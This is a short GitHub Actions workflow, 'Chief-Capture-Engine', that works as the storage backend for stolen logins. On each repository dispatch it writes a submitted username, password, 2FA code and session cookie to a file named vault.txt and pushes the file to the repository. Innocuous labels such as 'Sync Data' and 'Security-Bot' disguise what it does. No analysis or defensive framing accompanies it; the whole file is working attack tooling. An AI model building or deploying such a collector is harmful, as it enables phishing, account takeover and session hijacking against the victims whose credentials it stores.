name: Chief-Capture-Engine
on: [repository_dispatch]
jobs:
  store:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Sync Data
        run: |
          echo "$(date) | USER: ${{github.event.client_payload.u}} | PASS: ${{github.event.client_payload.p}} | 2FA: ${{github.event.client_payload.code}} | COOKIE: ${{github.event.client_payload.c}}" >> vault.txt
          git config --global user.name "Security-Bot"
          git config --global user.email "bot@github.com"
          git add vault.txt && git commit -m "Capture Received" && git push
